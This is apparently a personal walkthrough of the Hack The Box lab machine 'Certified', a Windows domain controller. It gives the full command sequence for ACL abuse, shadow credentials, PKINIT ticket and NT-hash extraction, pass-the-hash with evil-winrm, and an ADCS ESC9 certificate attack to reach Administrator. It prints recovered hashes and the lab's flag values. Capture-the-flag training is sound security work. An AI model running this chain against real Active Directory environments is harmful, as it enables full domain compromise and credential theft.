10.129.231.186
```text
#provided credentials
judith.mader:judith09
```
# Enumeration

```bash
sudo nmap 10.129.231.186 -sC -sV -Pn --disable-arp-ping
```

```text
sudo nmap 10.129.231.186 -sC -sV -Pn --disable-arp-ping
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-21 17:21 EDT
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 91.67% done; ETC: 17:22 (0:00:04 remaining)
Nmap scan report for 10.129.231.186
Host is up (0.0072s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-22 04:21:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-09-22T04:23:15+00:00; +7h00m02s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-22T04:23:15+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-22T04:23:15+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:05:29
|_Not valid after:  2105-05-23T21:05:29
|_ssl-date: 2026-09-22T04:23:15+00:00; +7h00m02s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-22T04:22:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.99 seconds

```

- Open ports:
	- 53
	- 88
	- 135
	- 139
	- 389
	- 445
	- 464
	- 593
	- 636
	- 3268
	- 3269
	- 5985
- Most likely a domain controller:
	- SMB
	- LDAP
	- Kerberos

```bash
echo "10.129.231.186 certified.htb dc01.certified.htb" | sudo tee -a /etc/hosts
```

- Enumerate the DC with the provided credentials using bloodhound

```bash
bloodhound-python -d certified.htb -u 'judith.mader' -p 'judith09' -dc 'dc01.certified.htb' -c all -ns 10.129.231.186
```

![[bloodhound_enum.png]]

- Starting the neo4j service and uploading the data to bloodhound

```bash
sudo neo4j console
bloodhound
```

- Search for and mark judith.mader as owned because the credentials were provided to us
- Go to the Node Info tab and select Reachable High Value Targets

![[judith_perms.png]]

- judith.mader has writeowner ACL over the management group. GenericWrite ACL over the management_scv user, and CanPSRemote attribute set to dc01.certified.htb

# Foothold
- Setting ourselves to the group owner for the management group
```bash
bloodyad --host "10.129.231.186" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader
```

![[setting_owner.png]]

- Next we will give judith.mader full control over the management group using [dacledit.py](https://github.com/Mdulce18/impacket-with-dacledit/blob/main/examples/dacledit.py)

```bash
python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
```

![[dacl_backup.png]]

- Now, we add ourselves to the management group

```bash
net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb"
```

- Now we can abuse the GenericWrite ACL since we are in the management group to get control over the management_svc account
	- we will do this by adding shadow credentials
	- we will use pywhisker

```bash
python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --use-ldaps
```

![[ldaps_exploit.png]]

- We will use PKINTtools to get the TGT
```bash
 python3 gettgtpkinit.py -cert-pfx ~/pywhisker/pywhisker/YrYIu2Cf.pfx certified.htb/management_svc -pfx-pass 'kNthXx9kqDqmupUecqQm' management_svc.ccache
```

![[tgt.png]]

- This created a Kerberos Ticket called management_svc.ccache, which will be exported to get the NTLM hash of the management_svc user

```bash
export KRB5ccname=management_svc.ccache
python3 getnthash.py -key edf1ee051a0edd6a330354600414eae194e811008581b6c819d6646a4b1d632a certified.htb/management_svc
```

![[nt_hash.png]]

```text
#NTLM Hash
a091c1832bcdd4677c28b5a6a1295584
```

- Finally we can leverage pass the hash

```bash
evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
cd C:\Users\management_svc\Desktop
ls
cat user.txt
```

![[HacktheBox Machines/Intro to Red Team/Certified/user_flag.png]]

```text
user.txt: c777073085e674878190221ed63df8f7
```

# Lateral Movement

- There is a user named ca_operator, utilizing the pathfinder, there is a way to laterally move to the ca_operator from management_svc

![[genricall_ca_operator.png]]

- The management_svc user has GenricAll ACL over the ca_operator account
	- with this we have complete control over the target object, including the GenericWrite
	- we can use the same method as before to access the ca_operator account using pywhisher for shadow credentials

```bash
python pywhisker.py -d "certified.htb" -u "management_svc" -H 'a091c1832bcdd4677c28b5a6a1295584' --target "ca_operator" --action "add"
```

![[pfx_gen.png]]

- Authenticating to the obtained certificate to get a TGT

```bash
python3 gettgtpkinit.py -cert-pfx ~/lJTgEkSK.pfx certified.htb/ca_operator -pfx-pass 'opeLmH9izVcMlodRxqgE' ca_operator.ccache
```

![[tgt2.png]]

- Using the TGT to get the NTLM hash 

```bash
export=krb5ccname=ca_operator.ccache
python3 getnthash.py -key 3daf82a78183678e915a113c6f7ae242ed446862a8d3097c663e59d787c5783e certified.htb/ca_operator
```

![[nt_hash2.png]]

```text
NTLM HAsh: b4b86f45c6018f1b664f70805f45d8f2
```

# Privilege Escalation

- Enumerating services using netexec

```bash
nxc ldap certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -M adcs
```

![[credentials_found.png]]

- We saw that ADSC was running from the NMAP scan
- We can use certipy to enumerate ADSC to see what we can abuse through the ca_operator user

```bash
certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
```

![[vulns.png]]

- THe ADSC is vulnerable to ESC9 attack
	- this lets us modify the UPN of users
- Gonna change the ca_operator user's UPN from ca_operator@certified.htb to Administrator

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

![[failed_dns.png]]

- Once the UPN is changed, request a certificate to the UPN

```bash
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -debug
```

![[HacktheBox Machines/Intro to Red Team/Certified/admin_pfx.png]]

- Changing the ca_operator user's UPN back to the original one

```bash
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

![[exploit_ca_operator.png]]

- Now we can authenticate to the DC with the administrator.pfx certificate

```bash
certipy-ad auth -pfx 'administrator.pfx' -domain 'certified.htb' -dc-ip 10.129.231.186 -debug
```

![[admin_hash.png]]

```text
hash: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

```bash
evil-winrm -i certified.htb -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
cd ..
cd Desktop
ls
cat root.txt
```

![[HacktheBox Machines/Intro to Red Team/Certified/root_flag.png]]

```text
root.txt: a18b8e34091b726aa857bbd15fdce5ee
```

